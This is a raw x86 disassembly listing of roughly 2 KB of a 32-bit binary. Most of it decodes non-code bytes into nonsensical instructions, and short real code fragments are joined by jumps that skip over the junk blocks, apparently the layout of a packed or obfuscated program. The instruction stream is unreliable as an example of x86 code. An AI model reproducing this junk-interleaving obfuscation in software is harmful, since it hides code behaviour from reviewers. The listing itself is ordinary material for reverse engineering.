  40ae23:	ins    BYTE PTR es:[edi],dx
  40ae24:	adc    esp,esp
  40ae26:	in     al,0xab
  40ae28:	inc    ecx
  40ae29:	cdq    
  40ae2a:	lea    eax,[ebx+eax*4]
  40ae2d:	out    dx,al
  40ae2e:	lahf   
  40ae2f:	push   0xdddafcf9
  40ae34:	mov    edx,0xb2e98212
  40ae39:	rcl    DWORD PTR [ebx+0xb6f60bc],cl
  40ae3f:	mov    edx,0x20ed5730
  40ae44:	mov    ds:0x6c7b6edd,eax
  40ae49:	fistp  QWORD PTR [edi]
  40ae4b:	dec    esi
  40ae4c:	int3   
  40ae4d:	retf   0x1450
  40ae50:	mov    eax,ds:0xb5b91045
  40ae55:	aam    0xdb
  40ae57:	inc    ecx
  40ae58:	aad    0x8a
  40ae5a:	fbstp  TBYTE PTR [esi+edi*2-0x618226f0]
  40ae61:	xchg   edx,eax
  40ae62:	inc    ecx
  40ae63:	(bad)  
  40ae64:	jp     0x40ae04
  40ae66:	mov    dh,0xc5
  40ae68:	test   BYTE PTR [edi-0x5608a36e],bh
  40ae6e:	and    dh,BYTE PTR ds:0x98f135
  40ae74:	add    eax,0x486d5b53
  40ae79:	push   ebp
  40ae7a:	sub    ch,BYTE PTR [eax-0x3]
  40ae7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae7e:	adc    BYTE PTR [esi],dl
  40ae80:	cmp    DWORD PTR [edx],ecx
  40ae82:	jmp    0x40ae32
  40ae84:	or     ch,dl
  40ae86:	xchg   ebx,eax
  40ae87:	mov    edi,0x80155eb2
  40ae8c:	cmp    eax,0xdf6cf91a
  40ae91:	add    eax,0xbd89a3e9
  40ae96:	xchg   esi,eax
  40ae97:	adc    esp,DWORD PTR [eax]
  40ae99:	inc    ecx
  40ae9a:	std    
  40ae9b:	cwde   
  40ae9c:	in     al,0xaf
  40ae9e:	hlt    
  40ae9f:	mov    ah,0x98
  40aea1:	xor    al,ah
  40aea3:	xchg   ebx,eax
  40aea4:	fidiv  DWORD PTR [ecx]
  40aea6:	jmp    0x5c13:0x9b99f9df
  40aead:	dec    edi
  40aeae:	scas   eax,DWORD PTR es:[edi]
  40aeaf:	inc    BYTE PTR [edi]
  40aeb1:	push   edi
  40aeb2:	xor    eax,0xdccf4d1a
  40aeb7:	push   esi
  40aeb8:	mov    ebx,0x1fe4e8a2
  40aebd:	xor    eax,0x6a3c9c03
  40aec2:	je     0x40ae88
  40aec4:	leave  
  40aec5:	xchg   DWORD PTR [edx],edi
  40aec7:	les    ebp,FWORD PTR [ebp-0x27713ace]
  40aecd:	dec    BYTE PTR [edi-0x31]
  40aed0:	das    
  40aed1:	lock fs dec eax
  40aed4:	sar    BYTE PTR ds:0x4279a5e6,0x4c
  40aedb:	ins    DWORD PTR es:[edi],dx
  40aedc:	gs adc esi,ebx
  40aedf:	inc    ecx
  40aee0:	and    BYTE PTR [ebx],0x56
  40aee3:	dec    esp
  40aee4:	stos   DWORD PTR es:[edi],eax
  40aee5:	xor    eax,0xb4d311eb
  40aeea:	inc    ebp
  40aeeb:	call   0x60ba85e4
  40aef0:	xchg   ecx,eax
  40aef1:	jp     0x40aef1
  40aef3:	dec    esi
  40aef4:	push   ebx
  40aef5:	imul   ebx,DWORD PTR [ecx+0x794cab2a],0xfffffff3
  40aefc:	call   0xc2ffbe58
  40af01:	push   ds
  40af02:	jnp    0x40ae91
  40af04:	arpl   WORD PTR [ecx+0x6f],dx
  40af07:	dec    ecx
  40af08:	int3   
  40af09:	retf   0xf606
  40af0c:	push   edi
  40af0d:	in     al,0x9f
  40af0f:	adc    BYTE PTR [edi+0x156b8252],ah
  40af15:	sahf   
  40af16:	outs   dx,BYTE PTR ds:[esi]
  40af17:	mov    BYTE PTR [ecx-0x75],dh
  40af1a:	(bad)  [ebx+0x36e83d8]
  40af20:	jg     0x40af25
  40af22:	sar    ch,cl
  40af24:	jl     0x40af27
  40af26:	and    DWORD PTR [eax+0x18793554],ebx
  40af2c:	xlat   BYTE PTR ds:[ebx]
  40af2d:	ss mov ecx,0x72c3e45d
  40af33:	out    0xd5,al
  40af35:	adc    BYTE PTR cs:[edx],cl
  40af38:	(bad)  
  40af39:	scas   eax,DWORD PTR es:[edi]
  40af3a:	add    ebx,ecx
  40af3c:	push   ebx
  40af3d:	jns    0x40af8b
  40af3f:	sbb    edx,ecx
  40af41:	shl    DWORD PTR ds:0x8a5823ee,cl
  40af47:	adc    dh,BYTE PTR [esi]
  40af49:	inc    ebx
  40af4a:	lods   al,BYTE PTR ds:[esi]
  40af4b:	popf   
  40af4c:	jno    0x40afa4
  40af4e:	test   DWORD PTR [eax-0x3d54b16a],ebx
  40af54:	jmp    0x40af4c
  40af56:	mov    esp,DWORD PTR [ebx]
  40af58:	aaa    
  40af59:	fs ja  0x40afd8
  40af5c:	rcr    DWORD PTR [ebx],1
  40af5e:	pushf  
  40af5f:	adc    BYTE PTR [ecx-0x63],0x8
  40af63:	jge    0x40afc6
  40af65:	add    al,0x80
  40af67:	fdivr  st(6),st
  40af69:	xor    ch,BYTE PTR [ecx-0x71]
  40af6c:	cld    
  40af6d:	call   0x8b8708d2
  40af72:	inc    eax
  40af73:	sbb    BYTE PTR [ecx+0x7018c9],al
  40af79:	add    BYTE PTR [ecx+0x458be045],cl
  40af7f:	in     al,dx
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x433827
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x4337df
  40af93:	sub    DWORD PTR ds:0x43378f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x4337db,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x4337db
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x4337db,ecx
  40afb8:	cmp    DWORD PTR ds:0x4337db,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x4337db,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x4337db,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x4337db
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x4337db,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x433827,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	cdq    
  40b018:	mov    ebp,0xf7644262
  40b01d:	jle    0x40b09d
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	sub    BYTE PTR [esi+0x54],dh
  40b026:	in     eax,dx
  40b027:	call   0x61d11f57
  40b02c:	xchg   ecx,eax
  40b02d:	fdiv   QWORD PTR [ecx+0x2a]
  40b030:	icebp  
  40b031:	test   eax,0xb8d2e354
  40b036:	sub    dl,al
  40b038:	xchg   ecx,eax
  40b039:	jno    0x40b066
  40b03b:	mov    ?,WORD PTR [eax+0x7c]
  40b03e:	push   cs
  40b03f:	mov    eax,0x782bd8a
  40b044:	inc    edx
  40b045:	dec    esi
  40b046:	jmp    0x6379b44c
  40b04b:	nop
  40b04c:	fcomp  st(2)
  40b04e:	call   0xc5a9:0x186aab33
  40b055:	mov    edi,0x291863ea
  40b05a:	lahf   
  40b05b:	mov    bl,0x69
  40b05d:	and    dl,BYTE PTR [edi-0x1fcd9b83]
  40b063:	fimul  DWORD PTR [ebx-0x27]
  40b066:	xchg   DWORD PTR [edx-0x614b5354],edi
  40b06c:	xlat   BYTE PTR ds:[ebx]
  40b06d:	xchg   esp,eax
  40b06e:	push   ebx
  40b06f:	clc    
  40b070:	in     al,0x38
  40b072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b073:	(bad)  [edx]
  40b075:	add    eax,0xfd5bdb45
  40b07a:	not    DWORD PTR [edi]
  40b07c:	mov    dl,0x63
  40b07e:	jle    0x40b00f
  40b080:	mov    al,0x82
  40b082:	push   edi
  40b083:	loopne 0x40b06d
  40b085:	iret   
  40b086:	sbb    dh,BYTE PTR [edi+eiz*8]
  40b089:	into   
  40b08a:	(bad)  
  40b08b:	gs aad 0x76
  40b08e:	inc    ebp
  40b08f:	push   esp
  40b090:	push   0xffffff9d
  40b092:	inc    ebx
  40b093:	xchg   DWORD PTR ds:[edi-0x12],esi
  40b097:	push   ss
  40b098:	idiv   BYTE PTR [esi]
  40b09a:	adc    al,0x37
  40b09c:	add    BYTE PTR ds:0xf8261ae5,0x71
  40b0a3:	loop   0x40b073
  40b0a5:	dec    ebx
  40b0a6:	jne    0x40b077
  40b0a8:	cs cdq 
  40b0aa:	loopne 0x40b11f
  40b0ac:	mov    esp,0xcb504036
  40b0b1:	and    eax,0xdb611f3e
  40b0b6:	jbe    0x40b04e
  40b0b8:	push   eax
  40b0b9:	scas   al,BYTE PTR es:[edi]
  40b0ba:	sti    
  40b0bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0bc:	adc    esi,DWORD PTR [edi-0x68]
  40b0bf:	pop    esi
  40b0c0:	lahf   
  40b0c1:	test   ax,0x3afb
  40b0c5:	imul   esi,DWORD PTR [esi-0x6625f685],0xfb15feb4
  40b0cf:	push   esp
  40b0d0:	mov    edi,cr6
  40b0d3:	or     al,0x13
  40b0d5:	aaa    
  40b0d6:	xchg   ebp,eax
  40b0d7:	das    
  40b0d8:	mov    ebx,0x6709484b
  40b0dd:	loopne 0x40b150
  40b0df:	rcl    ecx,0x80
  40b0e2:	fadd   QWORD PTR [ecx+0x78]
  40b0e5:	sar    DWORD PTR [eax-0x60],0xa8
  40b0e9:	dec    eax
  40b0ea:	mov    ebx,0xe6e955b3
  40b0ef:	cmp    dl,BYTE PTR [edx-0x71]
  40b0f2:	xchg   ecx,eax
  40b0f3:	mov    BYTE PTR [edi+0xc0a6aea],bl
  40b0f9:	test   al,0xe0
  40b0fb:	push   eax
  40b0fc:	hlt    
  40b0fd:	ins    DWORD PTR es:[edi],dx
  40b0fe:	scas   al,BYTE PTR es:[edi]
  40b0ff:	xor    bh,BYTE PTR [esi-0x35]
  40b102:	jnp    0x40b12c
  40b104:	packuswb mm6,QWORD PTR [eax-0x28]
  40b108:	push   edi
  40b109:	mov    dh,0x97
  40b10b:	push   esp
  40b10c:	mov    ah,0x9a
  40b10e:	pop    ebp
  40b10f:	xor    edi,DWORD PTR [ebx-0x59]
  40b112:	xor    ebx,DWORD PTR [ecx+ecx*1]
  40b115:	cmc    
  40b116:	xor    esi,ebp
  40b118:	pop    ss
  40b119:	xchg   edi,eax
  40b11a:	inc    edx
  40b11b:	outs   dx,DWORD PTR ds:[esi]
  40b11c:	fisttp QWORD PTR [ecx]
  40b11e:	icebp  
  40b11f:	xchg   DWORD PTR [ebx-0x5e39c741],edx
  40b125:	jmp    0x69d0832
  40b12a:	jecxz  0x40b0ef
  40b12c:	(bad)  
  40b12d:	mov    dl,0x86
  40b12f:	or     DWORD PTR [edx+0x214e862a],0xabe109b5
  40b139:	iret   
  40b13a:	jecxz  0x40b0d2
  40b13c:	adc    eax,DWORD PTR ds:0x1cf54d90
  40b142:	addr16 push edi
  40b144:	in     al,0x79
  40b146:	xor    BYTE PTR [ebx-0x5e],al
  40b149:	and    esp,edi
  40b14b:	addr16 ja 0x40b19f
  40b14e:	es ret 0x31db
  40b152:	xor    al,0x6f
  40b154:	scas   eax,DWORD PTR es:[edi]
  40b155:	shr    BYTE PTR [edx-0x11],0xcd
  40b159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b15a:	or     DWORD PTR [esi+esi*1+0x4faf1388],ebx
  40b161:	xchg   ch,ah
  40b163:	dec    edx
  40b164:	mov    esp,0xd185cf7d
  40b169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b16a:	fnstcw WORD PTR [ecx+0x3f894327]
  40b170:	stos   BYTE PTR es:[edi],al
  40b171:	repz ficom DWORD PTR [esi+0x61002392]
  40b178:	in     al,0xd5
  40b17a:	popf   
  40b17b:	sbb    DWORD PTR [edi+0x4eb0cb99],ecx
  40b181:	and    DWORD PTR [ebx],ebp
  40b183:	jb     0x40b153
  40b185:	data16 (bad) 
  40b187:	and    DWORD PTR [edx+0x36a23523],eax
  40b18d:	mov    ebp,0x3890ef1
  40b192:	int    0xbf
  40b194:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40b196:	mov    cs,WORD PTR [edi+0x67]
  40b199:	ror    cl,0x25
  40b19c:	test   DWORD PTR [ebx],0x111130b1
  40b1a2:	sahf   
  40b1a3:	scas   al,BYTE PTR es:[edi]
  40b1a4:	mov    ds:0x90abca51,eax
  40b1a9:	outs   dx,DWORD PTR ds:[esi]
  40b1aa:	das    
  40b1ab:	jle    0x40b1b1
  40b1ad:	and    al,0xf2
  40b1af:	adc    DWORD PTR [esi],ecx
  40b1b1:	mov    WORD PTR [edi-0x572fc766],?
  40b1b7:	sbb    BYTE PTR ds:0xcd000bb5,bh
  40b1bd:	daa    
  40b1be:	mov    esi,0x2679b7de
  40b1c3:	cs sahf 
  40b1c5:	mov    ecx,0x6fb92581
  40b1ca:	and    eax,0x39bc8721
  40b1cf:	stos   DWORD PTR es:[edi],eax
  40b1d0:	call   0xf7:0x1ddeb127
  40b1d7:	xor    eax,0xfe2bbfb4
  40b1dc:	or     DWORD PTR [ebp-0x50f26b5c],eax
  40b1e2:	mov    eax,0x181e0393
  40b1e7:	mov    cl,0xc1
  40b1e9:	push   edi
  40b1ea:	jo     0x40b18a
  40b1ec:	xchg   ecx,eax
  40b1ed:	push   esi
  40b1ee:	nop
  40b1ef:	pushf  
  40b1f0:	stc    
  40b1f1:	dec    edi
  40b1f2:	test   BYTE PTR [eax+0x3a],bl
  40b1f5:	aam    0x3d
  40b1f7:	mov    dl,0xbb
  40b1f9:	retf   
  40b1fa:	dec    ecx
  40b1fb:	push   edx
  40b1fc:	mov    bh,0x95
  40b1fe:	in     al,dx
  40b1ff:	pop    ebp
  40b200:	ins    DWORD PTR es:[edi],dx
  40b201:	in     eax,dx
  40b202:	inc    ebp
  40b203:	adc    DWORD PTR [ebp-0x7b],ebp
  40b206:	push   ss
  40b207:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b208:	mov    edx,esp
  40b20a:	(bad)  
  40b20b:	jp     0x40b283
  40b20d:	cwde   
  40b20e:	test   al,0x4d
  40b210:	inc    ecx
  40b211:	push   esi
  40b212:	lods   eax,DWORD PTR ds:[esi]
  40b213:	dec    esp
  40b214:	cli    
  40b215:	loopne 0x40b1e1
  40b217:	mov    edi,0x167d31d4
  40b21c:	adc    al,0x1e
  40b21e:	out    0xe2,al
  40b220:	(bad)  
  40b221:	rol    BYTE PTR [edx+0x601a1984],1
  40b227:	sub    edx,0xf
  40b22a:	fistp  QWORD PTR fs:[esi-0x3f1b4f80]
  40b231:	sbb    ah,BYTE PTR [ecx+0x7c]
  40b234:	lock out 0xe1,eax
  40b237:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b238:	xchg   esp,eax
  40b239:	ss jle 0x40b226
  40b23c:	xor    esi,ebp
  40b23e:	xchg   BYTE PTR [edi+0x48],bh
  40b241:	loop   0x40b27b
  40b243:	fld    QWORD PTR [ebp-0x1e]
  40b246:	sbb    esi,DWORD PTR [esi-0x7727535c]
  40b24c:	imul   ebp,DWORD PTR [edi+edx*4],0x67
  40b250:	(bad)  
  40b251:	icebp  
  40b252:	pop    ebx
  40b253:	cld    
  40b254:	std    
  40b255:	pop    DWORD PTR [eax-0x711efee8]
  40b25b:	int3   
  40b25c:	mov    dl,0xe1
  40b25e:	xor    BYTE PTR [ecx-0xa],bl
  40b261:	mov    al,ds:0x925fae48
  40b266:	outs   dx,BYTE PTR ds:[esi]
  40b267:	daa    
  40b268:	xchg   edi,eax
  40b269:	mov    eax,DWORD PTR [ebp-0x14]
  40b26c:	mov    ecx,DWORD PTR [ebp+0x8]
  40b26f:	add    ecx,DWORD PTR [eax+0x24]
  40b272:	jmp    0x40b4d5
  40b277:	jno    0x40b206
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	xchg   edi,eax
  40b284:	jnp    0x40b26d
  40b286:	mov    ch,0x2e
  40b288:	bnd jle 0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	clc    
  40b290:	ins    DWORD PTR es:[edi],dx
  40b291:	mov    eax,ds:0x7662755
  40b296:	sub    DWORD PTR [edx-0x41fc96ab],0xffffff9b
  40b29d:	aaa    
  40b29e:	mov    eax,ds:0xcff81db6
  40b2a3:	jp     0x40b309
  40b2a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2a6:	or     al,0xdd
  40b2a8:	shl    BYTE PTR [eax-0x69],0xe5
  40b2ac:	int    0xb0
  40b2ae:	test   DWORD PTR [esi-0x252a7bab],eax
  40b2b4:	sub    ch,BYTE PTR [edi+0x45924991]
  40b2ba:	cmp    eax,0xfb95f8a2
  40b2bf:	test   ch,0x5
  40b2c2:	add    bh,ch
  40b2c4:	xchg   ecx,eax
  40b2c5:	ret    
  40b2c6:	pop    ss
  40b2c7:	mov    bl,0x34
  40b2c9:	cld    
  40b2ca:	adc    ebp,ebx
  40b2cc:	sahf   
  40b2cd:	in     al,0xba
  40b2cf:	iret   
  40b2d0:	je     0x40b304
  40b2d2:	inc    esi
  40b2d3:	das    
  40b2d4:	into   
  40b2d5:	sub    BYTE PTR [eax],cl
  40b2d7:	hlt    
  40b2d8:	or     ebp,esp
  40b2da:	mov    eax,ds:0x614fa698
  40b2df:	out    dx,eax
  40b2e0:	fistp  DWORD PTR [eax]
  40b2e2:	push   ss
  40b2e3:	ret    
  40b2e4:	scas   eax,DWORD PTR es:[edi]
  40b2e5:	pop    ss
  40b2e6:	retf   0x5c66
  40b2e9:	inc    eax
  40b2ea:	inc    eax
  40b2eb:	enter  0xb7f0,0x96
  40b2ef:	dec    esp
  40b2f0:	iret   
  40b2f1:	ret    
  40b2f2:	inc    ecx
  40b2f3:	adc    cl,BYTE PTR [ebx]
  40b2f5:	sbb    al,0xc9
  40b2f7:	icebp  
  40b2f8:	mov    bh,0x73
  40b2fa:	push   edi
  40b2fb:	dec    ebp
  40b2fc:	mov    ds,WORD PTR [eax+0x73]
  40b2ff:	(bad)  
  40b300:	xor    cl,BYTE PTR [ecx-0x66f6acac]
  40b306:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b307:	or     esp,DWORD PTR [eax+edi*4]
  40b30a:	or     ebx,edi
  40b30c:	push   eax
  40b30d:	xchg   ecx,eax
  40b30e:	nop
  40b30f:	xchg   DWORD PTR [ecx+0x1f],esi
  40b312:	xchg   ecx,eax
  40b313:	dec    esi
  40b314:	leave  
  40b315:	stc    
  40b316:	add    eax,0xfee53216
  40b31b:	jmp    0xdda2813d
  40b320:	mov    eax,0xd810fc46
  40b325:	cmp    ch,BYTE PTR [eax-0x56]
  40b328:	jns    0x40b2d1
  40b32a:	adc    DWORD PTR ds:0x319069bc,edx
  40b330:	jmp    0x5735071d
  40b335:	and    DWORD PTR [esi],esi
  40b337:	cmp    edx,esp
  40b339:	adc    esi,DWORD PTR [esi+0x5]
  40b33c:	pushf  
  40b33d:	jge    0x40b39c
  40b33f:	cmp    ebp,DWORD PTR [ebx]
  40b341:	dec    DWORD PTR [eax-0x5c]
  40b344:	(bad)  
  40b345:	out    dx,al
  40b346:	adc    eax,0xd40e6887
  40b34b:	repz mov ds:0x10a91c53,al
  40b351:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b352:	inc    esp
  40b353:	aam    0xfb
  40b355:	jno    0x40b3ca
  40b357:	adc    DWORD PTR [edi-0x5c945e02],esi
  40b35d:	leave  
  40b35e:	adc    al,0xce
  40b360:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b362:	mov    esp,0x685471fc
  40b367:	sbb    dh,BYTE PTR [ecx+0x50902072]
  40b36d:	sbb    bl,BYTE PTR [edi]
  40b36f:	pop    ss
  40b370:	int    0x73
  40b372:	shl    BYTE PTR [ebx],0xe4
  40b375:	nop
  40b376:	test   dl,ch
  40b378:	ss xor eax,0xfb38e72c
  40b37e:	jns    0x40b3d5
  40b380:	mov    ah,0x8c
  40b382:	ja     0x40b3e2
  40b384:	int3   
  40b385:	pushf  
  40b386:	xor    DWORD PTR [ebx],0x6e0d23e7
  40b38c:	mov    ds:0xf336e7e5,eax
  40b391:	shl    BYTE PTR [ebp+0x3b],0x15
  40b395:	jle    0x40b378
  40b397:	jg     0x40b35b
  40b399:	mov    ebx,0xd8ed0cec
  40b39e:	shl    BYTE PTR [ecx+0x74],0xcf
  40b3a2:	cld    
  40b3a3:	or     ebp,DWORD PTR [edx+0x781f21b3]
  40b3a9:	ret    0xf66
  40b3ac:	js     0x40b380
  40b3ae:	jmp    0x61f0:0x5a2843c7
  40b3b5:	out    dx,al
  40b3b6:	xchg   edi,eax
  40b3b7:	mov    ah,0xe0
  40b3b9:	icebp  
  40b3ba:	xchg   esi,eax
  40b3bb:	dec    ebx
  40b3bc:	test   BYTE PTR [edx],ch
  40b3be:	aam    0xc6
  40b3c0:	call   0x3c0e:0x16047d92
  40b3c7:	sub    eax,0x13815f9e
  40b3cc:	mov    eax,0x2e5b0fa2
  40b3d1:	cmp    eax,0x7bc9c9e0
  40b3d6:	inc    ebx
  40b3d7:	cmp    edx,DWORD PTR [edx-0x34]
  40b3da:	mov    ch,0x29
  40b3dc:	int    0xb1
  40b3de:	bound  edx,QWORD PTR [eax+0x60]
  40b3e1:	into   
  40b3e2:	mov    eax,ds:0x2caf39bf
  40b3e7:	outs   dx,DWORD PTR ds:[esi]
  40b3e8:	jle    0x40b40b
  40b3ea:	mov    edx,0x13640295
  40b3ef:	pop    esp
  40b3f0:	inc    eax
  40b3f1:	pop    ds
  40b3f2:	and    ah,BYTE PTR [esi]
  40b3f4:	aam    0x68
  40b3f6:	add    DWORD PTR [eax-0x65],edi
  40b3f9:	stc    
  40b3fa:	out    0xda,al
  40b3fc:	mov    dh,0x5c
  40b3fe:	push   edi
  40b3ff:	jb     0x40b3c8
  40b401:	fs jmp 0x40b3b2
  40b404:	test   DWORD PTR [ebp+esi*4-0x78028f28],edi
  40b40b:	pop    ds
  40b40c:	arpl   WORD PTR [ecx],bp
  40b40e:	call   0x3108:0xfdb1a5f8
  40b415:	fs xor eax,0x8f619b65
  40b41b:	mov    ch,0x74
  40b41d:	repnz mov al,ds:0x90de90f8
  40b423:	fwait
  40b424:	rep stos DWORD PTR es:[edi],eax
  40b426:	pop    eax
  40b427:	pop    ds
  40b428:	push   esp
  40b429:	or     cl,BYTE PTR [edx+0x7]
  40b42c:	fstp   QWORD PTR [edx]
  40b42e:	jne    0x40b49d
  40b430:	nop
  40b431:	ss jbe 0x40b463
  40b434:	sbb    al,0xdd
  40b436:	scas   al,BYTE PTR es:[edi]
  40b437:	ja     0x40b45c
  40b439:	loopne 0x40b48b
  40b43b:	(bad)  
  40b43c:	pusha  
  40b43d:	aaa    
  40b43e:	push   esp
  40b43f:	cld    
  40b440:	xlat   BYTE PTR ds:[ebx]
  40b441:	cmp    eax,0x4ddd8951
  40b446:	pop    ss
  40b447:	add    ah,cl
  40b449:	or     BYTE PTR [esi],dh
  40b44b:	xor    dl,dh
  40b44d:	pop    eax
  40b44e:	jg     0x40b474
  40b450:	pushf  
  40b451:	cmp    dl,0x53
  40b454:	call   0x88b7ed48
  40b459:	and    ecx,DWORD PTR [ebx]
  40b45b:	out    0xa0,eax
  40b45d:	jne    0x40b4cd
  40b45f:	das    
  40b460:	xor    al,dh
  40b462:	fcom   QWORD PTR ds:0x6acde15f
  40b468:	add    al,0xd4
  40b46a:	sar    BYTE PTR [edx-0x61],0xf8
  40b46e:	pop    eax
  40b46f:	xchg   ebp,eax
  40b470:	mov    BYTE PTR ds:0xf0979a6e,ch
  40b476:	ret    
  40b477:	pushf  
  40b478:	stos   BYTE PTR es:[edi],al
  40b479:	test   ecx,edx
  40b47b:	mov    eax,0x3cfe4ea4
  40b480:	dec    edx
  40b481:	iret   
  40b482:	hlt    
  40b483:	stos   DWORD PTR es:[edi],eax
  40b484:	int    0x54
  40b486:	push   edi
  40b487:	in     eax,dx
  40b488:	cmp    eax,0x10046c41
  40b48d:	gs in  eax,dx
  40b48f:	addr16 add al,0xc8
  40b492:	pop    edi
  40b493:	stos   BYTE PTR es:[edi],al
  40b494:	clc    
  40b495:	mov    dh,0x30
  40b497:	push   0x2cfa574a
  40b49c:	and    BYTE PTR [ebp+0x503b190],dl
  40b4a2:	aad    0x19
  40b4a4:	dec    edi
  40b4a5:	hlt    
  40b4a6:	daa    
  40b4a7:	ret    0x24dc
  40b4aa:	fisttp WORD PTR [edi-0x1c8ee807]
  40b4b0:	jp     0x40b518
  40b4b2:	mov    edi,DWORD PTR [ebp-0x5e]
  40b4b5:	mov    bh,BYTE PTR [ecx+0x5b]
  40b4b8:	mov    bl,0x0
  40b4ba:	mov    cl,0xda
  40b4bc:	loop   0x40b49a
  40b4be:	je     0x40b460
  40b4c0:	and    esp,0xffffffed
  40b4c3:	mov    dl,0xfc
  40b4c5:	lods   eax,DWORD PTR ds:[esi]
  40b4c6:	sub    DWORD PTR [ecx+ebp*8-0x628eca2e],edi
  40b4cd:	inc    DWORD PTR [edi+eax*8]
  40b4d0:	or     eax,0x7634a45a
  40b4d5:	mov    DWORD PTR [ebp-0x2c],ecx
  40b4d8:	mov    eax,DWORD PTR [ebp-0x14]
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	xor    DWORD PTR [ebx],ebx
  40b509:	cld    
  40b50a:	fucomi st,st(0)
  40b50c:	lock jle 0x40b58d
  40b50f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b513:	or     ebp,DWORD PTR [ecx-0x199726d3]
  40b519:	cwde   
  40b51a:	xor    eax,0x44916293
  40b51f:	aam    0x2e
  40b521:	jg     0x40b4b9
  40b523:	jmp    0x7e5e1e76
  40b528:	jge    0x40b4c1
  40b52a:	icebp  
  40b52b:	xchg   esi,eax
  40b52c:	dec    ebp
  40b52d:	out    dx,eax
  40b52e:	loope  0x40b574
  40b530:	xchg   edi,eax
  40b531:	cmp    ebx,DWORD PTR ds:0xd40524a4
  40b537:	add    eax,0xc3e60576
  40b53c:	repz loopne 0x40b523
  40b53f:	lahf   
  40b540:	adc    al,0xe3
  40b542:	xchg   edi,eax
  40b543:	out    0x50,eax
  40b545:	loop   0x40b4f2
  40b547:	stos   BYTE PTR es:[edi],al
  40b548:	mov    edx,0x4de0595c
  40b54d:	inc    edx
  40b54e:	aas    
  40b54f:	push   esi
  40b550:	out    dx,eax
  40b551:	imul   ebx,DWORD PTR [esi+0x6cdfdd43],0x8f4ed107
  40b55b:	inc    eax
  40b55c:	add    BYTE PTR [ecx-0x173c1385],ah
  40b562:	mov    eax,ds:0x865a7c52
  40b567:	lods   eax,DWORD PTR ds:[esi]
  40b568:	mov    ecx,0x4ae7c777
  40b56d:	imul   esi,DWORD PTR [ecx],0xd98b9650
  40b573:	out    0x4b,eax
  40b575:	cdq    
  40b576:	pop    ecx
  40b577:	lods   eax,DWORD PTR ds:[esi]
  40b578:	pop    es
  40b579:	nop
  40b57a:	fcomip st,st(6)
  40b57c:	sti    
  40b57d:	cmp    ch,BYTE PTR [ebx]
  40b57f:	jmp    0x40b515
  40b581:	(bad)  
  40b582:	jae    0x40b546
  40b584:	and    DWORD PTR [ecx+0x68833424],ecx
  40b58a:	les    ebx,FWORD PTR [edx]
  40b58c:	pop    eax
  40b58d:	add    BYTE PTR [ebp+0x64271a7],ch
  40b593:	js     0x40b59d
  40b595:	in     eax,dx
  40b596:	push   0x9c553fe7
  40b59b:	inc    ebx
  40b59c:	pop    esi
  40b59d:	es mov dl,0x74
  40b5a0:	shr    dl,1
  40b5a2:	push   edi
  40b5a3:	and    ecx,DWORD PTR [ebx+0x5076b5a5]
  40b5a9:	push   cs
  40b5aa:	cwde   
  40b5ab:	add    eax,0x8d5e6cca
  40b5b0:	cli    
  40b5b1:	cwde   
  40b5b2:	repnz dec eax
  40b5b4:	fistp  WORD PTR [edx+0x4a438103]
  40b5ba:	je     0x40b5ca
  40b5bc:	cmp    al,0x59
  40b5be:	imul   esp,DWORD PTR [edx+0x77],0x4b
  40b5c2:	arpl   WORD PTR [eax-0x2b785e40],bp
  40b5c8:	sar    BYTE PTR [ebx-0x6e],0x73
  40b5cc:	inc    eax
  40b5cd:	adc    eax,0x5ebda46c
  40b5d2:	cmc    
  40b5d3:	cdq    
  40b5d4:	push   eax
